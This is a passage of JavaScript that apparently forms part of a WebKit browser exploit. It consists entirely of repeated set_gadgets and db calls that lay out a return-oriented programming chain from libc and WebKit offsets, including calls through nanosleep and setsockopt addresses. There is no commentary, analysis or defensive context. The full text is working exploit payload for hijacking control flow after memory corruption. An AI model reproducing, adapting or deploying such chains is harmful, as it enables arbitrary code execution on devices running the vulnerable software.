libc_base+186490, 
libc_base+793877, 
ropchain+243448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+243472, 
ropchain+243488, 
libc_base+811575, 
ropchain+243504, 
libc_base+811575, 
ropchain+243520, 
libc_base+811575, 
ropchain+240640, 
libc_base+793877, 
ropchain+243600, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+243584, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+243696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243712, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+243824, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+243808, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
nanosleep_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+245152, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+246480, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+246552, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+246616, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+246768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+246784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+246936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+246968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+246952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+246920, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247064, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+247048, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+247272, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+247288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+247256, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247360, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+247376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+247568, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+247520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+247536, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+247552, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+785347, 
libc_base+793877, 
ropchain+247712, 
webkit_base+7438103, 
libc_base+272260, 
libc_base+793877, 
ropchain+247680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+247696, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+247896, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294967295, 4294967295]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+582033, 
libc_base+793877, 
ropchain+247984, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+248040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+5202439, 
libc_base+793877, 
ropchain+248120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+248264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+248432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+248464, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248448, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+248416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+248560, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+248544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+248880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+248896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+248864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+249000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+248984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+249160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+249280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+249264, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+249416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+249592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+249560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+249544, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+249696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+249680, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+249776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+249880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+249896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+250000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+249984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+250056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+250144, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967292, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+250248, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+250264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+250416, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+250448, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+250432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+250400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+250520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+250536, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+250696, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+250664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+250648, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+250800, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+250784, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+250880, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+250984, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+251000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([1, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+251272, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+251464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+251432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+251568, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+251552, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+251648, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+251752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+251768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251872, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+251856, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+251928, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([2, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+252040, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+252144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+252280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+252312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252264, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+252400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+252576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+252528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+252632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+252736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+252768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+252752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+252928, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+252896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+252880, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+253032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+253016, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([2, 0]); 
set_gadget(libc_base+788575,); 
db([2, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+253240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+253256, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+253224, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
